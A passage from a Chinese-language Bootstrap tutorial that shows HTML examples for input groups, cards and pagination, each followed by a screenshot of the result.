        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"range"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-range"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-check-label"</span>&gt;</span>开关<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d8c069c88974f26a1ca5b2d614e5fc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=aXcTiAoyCcgHHjk5i%2FKCH2V5NCs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-157">表单组</h3>
<h4 data-id="heading-158">基础使用</h4>
<p><code>.input-group</code>是一种容器，通过在输入的字段的前面或后面添加图标、文字或按钮来增强输入，使用<code>.input-group-text</code>指定帮助文本的样式。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group-text"</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"用户名"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4e8f74c8e054cc59276e498783af89c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=qFuuV658GW0IPRtCgaIJVTLOdJs%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-159">输入组大小</h4>
<p>我们可以通过<code>.input-group-lg</code>和<code>.form-select-sm</code>来更改输入控件的大小。</p>
<h4 data-id="heading-160">多个输入</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group-text"</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"姓"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"名"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbc269aa1a5e4d89b77ebc25822ddd05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=OHsfpRXhu8EWvLYXk8nBkt72XYM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-161">带按钮的输入组</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入用户名"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>搜索<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c07b73693094ce39e2a854124398c58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=oaNkE99wIfeoSX13EPR3FXejLKc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-162">带下拉按钮的输入组</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入用户名"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary dropdown-toggle"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"dropdown"</span>&gt;</span>下拉<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-menu"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-divider"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-header"</span>&gt;</span>
              Polaris
          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/581156da751d480ab7a98169ac153fd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=4xTmfRXMpCqOxfwMRAj5ZF0gfIw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-163">Bootstrap 卡片</h2>
<p>Bootstrap 卡片提供了一个灵活的、可扩展的内容容器。可以通过类<code>.card</code>与<code>.card-body</code>可以快速创建一个简单的卡片，卡片可以包含头部、内容、底部以及各种颜色设置。</p>
<h3 data-id="heading-164">创建基本卡片</h3>
<p>我们可以在外部容器使用<code>.card</code>，内容可以防止<code>.card-body</code>元素内，这样我们就得到了一个简单的卡片元素。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body"</span>&gt;</span>基础卡片<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7149dfee6e044c2f8f65ecb68567ce54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=jD%2B7WQJXhxl2UwEvh8OeuO5IriA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-165">页眉与页脚</h3>
<p>我们还可以使用<code>.card-header</code>和<code>.card-footer</code>分别为卡片创建页眉与页脚。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-header"</span>&gt;</span>页眉<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body"</span>&gt;</span>基础卡片<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-footer"</span>&gt;</span>页脚<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f34d5a1c8ce443bbbaf98b7c9eb9344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=6oDeAB9%2BH%2BXqQrWfijCs07G5vnw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-166">带标题、文本和链接的卡片</h3>
<p>我们还可以使用<code>.card-title</code>、<code>card-text</code>和<code>.card-line</code>分别来为卡片创建标题、文本和链接等等。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card m-3"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-header"</span>&gt;</span>页眉<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>一些文本<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-link"</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-footer"</span>&gt;</span>页脚<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42d4b36a2d2b45d8a6d5071a2b02e132~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=3U7UIjdVcX2ZqfQEph3g7CkQDWg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-167">设置图片背景</h3>
<p>我们通过在图片上设置<code>.card-img-top</code>在内容上设置<code>.card-img-overlay</code>将图片转换为卡片背景</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img-top"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img-overlay"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>一些文本<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-link"</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e9c6e8d67c04fff98ed3a5cd22aafe4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=v31LmoCTkXSafPdUR0XAS9MK21I%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-168">Bootstrap 分页</h2>
<p>分页策略是在数据多的时候我们一次性加载完全会导致用户体验不佳页面卡顿等问题的一个解决方案。Bootstrap也为我们提供了如何定义分页等效果。</p>
<h3 data-id="heading-169">基础的分页</h3>
<p>要创建一个分页我们可以在<code>ul</code>元素中添加<code>.pagination</code>,然后在<code>li</code>元素上添加<code>.page-item</code>类，</p>
<p>也可以为元素中的<code>a</code>标签添加<code>.page-link</code>。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"pagination m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>上一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>下一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c1ec9c420e54fe38e2a8c97d617e3ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=0voKOC3icx6rHKqNScMIpabg7No%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-170">活动状态的分页</h3>
<p><code>.active</code>用于突出显示当前页面。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"pagination m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>上一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item active"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>下一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f4dc32aa12d4994aa3227e79d6d48fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=h62NCRuC%2F1huHic5v0akCdCWYVc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-171">禁用状态分页</h3>
<p><code>.disabled</code>用于不可点击的链接。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"pagination m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>上一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item active"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item disabled"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>下一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3129b5c0acc64003bce9f9fd2c029462~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=es0SrYsfSdGdBEXryEVQVvCYSl4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-172">分页大小</h3>
<p>我们可以使用<code>.pagination-lg</code>和<code>.pagination-sm</code>来分别设置分页按钮更大或更小。</p>
<h3 data-id="heading-173">分页对齐</h3>
<p>默认我们分页是左对齐，我们也可以使用<code>.justify-content-center</code>来设置居中对齐。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"pagination justify-content-center m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>上一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item active"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item disabled"</span>&gt;</span>
